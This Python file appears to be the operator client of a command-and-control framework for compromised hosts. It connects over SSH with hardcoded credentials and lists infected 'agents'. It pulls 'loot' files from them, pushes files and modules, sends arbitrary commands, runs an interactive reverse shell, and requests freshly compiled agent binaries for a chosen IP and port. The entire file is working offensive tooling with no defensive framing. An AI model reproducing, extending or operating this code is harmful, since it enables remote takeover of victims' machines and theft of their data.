import paramiko
import misc
import os
import termios
import fcntl
import select
import sys
import pty
import base64 as b64

class AgentStruct():
    def __init__(self, id, connection_time, hostname, interfaces, process_owner):
        self.id = id
        self.connection_time = connection_time
        self.hostname = hostname
        self.interfaces = interfaces
        self.process_owner = process_owner

class Session():
    def __init__(self, address, port=22):
        self.address = address
        self.port = port
        self.ssh = paramiko.SSHClient()
        self.ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        self.channel = 0
        self.agents = []


    def update_addr(self, address):
        self.address = address

    def update_port(self, port):
        self.port = port

    def parse_interfaces(self, inp):
        interfaces = []
        addresses = []
        ret = []
        data = inp.split(",")
        try:
            for d_set in data:
                d_set = d_set.split(":")
                if d_set[0] == "NA":
                    raise IndexError("Got NA interface data")
                interfaces.append(d_set[0])
                addresses.append(d_set[1])
        except IndexError:
            interfaces.append("NA")
            addresses.append("NA")

        ret.append(interfaces)
        ret.append(addresses)
        return ret

    def init_connection(self):
        self.ssh.connect(hostname=self.address, port=self.port, username='aris', password='lala', allow_agent=False)

        self.channel = self.ssh._transport.open_session()
        self.channel.invoke_shell()
                
        stdin = self.channel.makefile('wb')
        stdout = self.channel.makefile('r')

        # Initiate the connection
        self.channel.sendall("0")
        out = self.channel.recv(5)
        self.channel.sendall("20|all")
        while out != "fi":
            out = self.channel.recv(8196).decode()
            if out != "fi":
                out = out.split("\n")
                if len(out) < 5:
                    print("Out was too short of a fuckin list")
                    continue

                interfaces = self.parse_interfaces(out[1])
                appnd = AgentStruct(out[0],out[2],out[3],interfaces,out[4])
                self.agents.append(appnd)
                self.channel.sendall('0')
        
        print("[+] Successfully gathered agent information")

    def update(self):
        out = ""
        tmp = self.agents
        self.agents = []
        self.channel.sendall("20|all")
        while out != "fi":
            out = self.channel.recv(8196).decode()
            if out != "fi":
                out = out.split("\n")
                if len(out) < 5:
                    print("Out was too short of a fuckin list")
                    continue

                interfaces = self.parse_interfaces(out[1])
                appnd = AgentStruct(out[0],out[2],out[3],interfaces,out[4])
                self.agents.append(appnd)
                self.channel.sendall('0')
        
        print("[+] Successfully gathered agent information")
        return 0

    def download_loot(self, agent_id):
        filepath = "."#misc.getSavePath()
        cnt=0
        data = b""
        ret = b""
        ret_dat = b""
        tmpbf = b""

        if not filepath:
            return 1

        self.channel.sendall("22|"+agent_id)
        num = int(self.channel.recv(8192).decode())
        self.channel.send("rd")    
        for i in range(num):
            cnt = 0
            data = b''
            
            name = self.channel.recv(256).strip(b'\x00')#.decode()
            print(name)
            name = name.decode()
            if name == 'fi':
                print("received last file successfully")
                break
            
            self.channel.sendall("ok")
            
            size = int(self.channel.recv(8192).decode())
            
            self.channel.sendall("ok")
            
            dat = self.channel.recv(size)
            file = open(filepath + "/" + name, "wb")
            data = b64.decodebytes(dat)
            file.write(data) 
            file.close()
            
            ret = self.channel.recv(256).strip(b'\x00')
            if ret != b'fi':
                print("got next")
                
                self.channel.send('rd')
                print(ret)
            else:
                print("[+] Got finished notification")
                break  
        print("Complete")
        return 0

    def upload_file(self, agent_id, file):
        print("[ ] Doing upload")
        self.channel.sendall("23|" + agent_id + ":" + file.filename)
        self.channel.recv(3)
        #print(file.filename)
        #self.channel.send(file.filename)
        #self.channel.recv(3)
        
        buff = b64.encodebytes(file.data).replace(b'\n', b'')
        
        self.channel.send(str(len(buff)))
        self.channel.recv(3)
        self.channel.send(buff)
        ret = self.channel.recv(3)
        print("[+] Success")
        return 0

    def do_download(self, agent_id, path):
        print("[ ] Doing Download...")
        self.channel.sendall("24|%s:%s" % (agent_id, path))
        self.channel.recv(2)
        print("[+] Tasked agent with download")
        return 0

    def push_module(self, agent_id, filestruct):
        print("[ ] Pushing module file to agent %s..." % agent_id)
        self.channel.sendall("25|%s" % agent_id)
        self.channel.recv(3)
        self.channel.send(filestruct.filename)
        self.channel.recv(3)
        
        buff = b64.encodebytes(filestruct.data).replace(b'\n', b'')
        
        self.channel.send(str(len(buff)))
        self.channel.recv(3)
        self.channel.send(buff)
        ret = self.channel.recv(3)
        print("[+] Success")
        return 0

    def send_command(self, agent_id, command):
        print("[ ] Sending command to agent...")
        self.channel.sendall("26|%s:%s" % (agent_id, command))
        return 0

    def req_revsh(self, agent_id, port):
        print("[ ] Sending Reverse Shell Request...")
        self.channel.sendall("27|%s:%s" % (agent_id, port))

    def do_revsh(self, agent_id, port):
        exiting = False
        inputs = []
        inputs.append(self.channel)
        pty = Shell()
        inputs.append(pty)
        cbuffer = ""

        print("[+] Connected")
        while not exiting:
            try:
                inputrd, outputrd, errorrd = select.select(inputs,[],[])
            except select.error as e:
                print(str(e))
                break   
            #except socket.error as e:
             #   print(str(e))
              #  break

            for s in inputrd:
                if s == self.channel:
                    try:
                        data = s.recv(1)
                        data = data.decode()
                    except UnicodeDecodeError:
                        print("Failed to decode data")
                        print(data)
                        continue
                    if data == '':
                        print("Backconnect vanished!")
                        sys.exit(1)

                    cbuffer += data
                    cbuffer = cbuffer.encode()
                    pty.write(cbuffer)
                    cbuffer = ""
            
                elif s == pty:
                    data = s.read(1024)
                    self.channel.send(data)
                else:
                    print("Woops finding inputfd")
            cbuffer = ""

    def compile_agent(self, ip, port):
        print("[ ] Sending compile request to server (%s:%d)..." % (ip, port))
        self.channel.sendall("28|%s:%s" % (ip, port))
        fileData = b""
        data = self.channel.recv(128).decode()
        print(data)
        size = int(data.strip('\x00'))
        #size = int(self.channel.recv(128).decode())
        self.channel.send("ok")
        fileData = self.channel.recv(size)
        if len(fileData) < size:
            fileData += self.channel.recv(size)
        print(len(fileData))
        file = b64.decodebytes(fileData[:size])
        misc.save_file(file)
        return 0

    def register_agent(self, name, password):
        print("[ ] Registering agent with server...")
        self.channel.sendall('29|%s:%s' % (name, password))
        return 0

    def clean_exit(self):
        if self.channel != 0:
            self.channel.sendall("00")
            self.channel = 0
            print("[+] Backend closed down")

class Shell(object):
    def __init__(self, port, slave=0, pid=os.getpid()):
        self.port = port

        self.termios, self.fcntl = termios, fcntl

        self.pty = open(os.readlink("/proc/%d/fd/%d" % (pid, slave)), "rb+", buffering=0)

        self.oldtermios = termios.tcgetattr(self.pty)
        newattr = termios.tcgetattr(self.pty)
        newattr[3] &= ~termios.ICANON & ~termios.ECHO

        termios.tcsetattr(self.pty, termios.TCSADRAIN, newattr)

        self.oldflags = fcntl.fcntl(self.pty, fcntl.F_GETFL)
        fcntl.fcntl(self.pty, fcntl.F_SETFD, fcntl.FD_CLOEXEC)
        fcntl.fcntl(self.pty, fcntl.F_SETFL, self.oldflags | os.O_NONBLOCK)

    def read(self, size=8192):
        return self.pty.read(size)
    def write(self, data):
        return self.pty.write(data)
    def fileno(self):
        return self.pty.fileno()
    def __del__(self):
        self.termios.tcsetattr(self.pty, self.termios.TCSAFLUSH,self.oldtermios)
        self.fcntl.fcntl(self.pty, self.fcntl.F_SETFL, self.oldflags)
    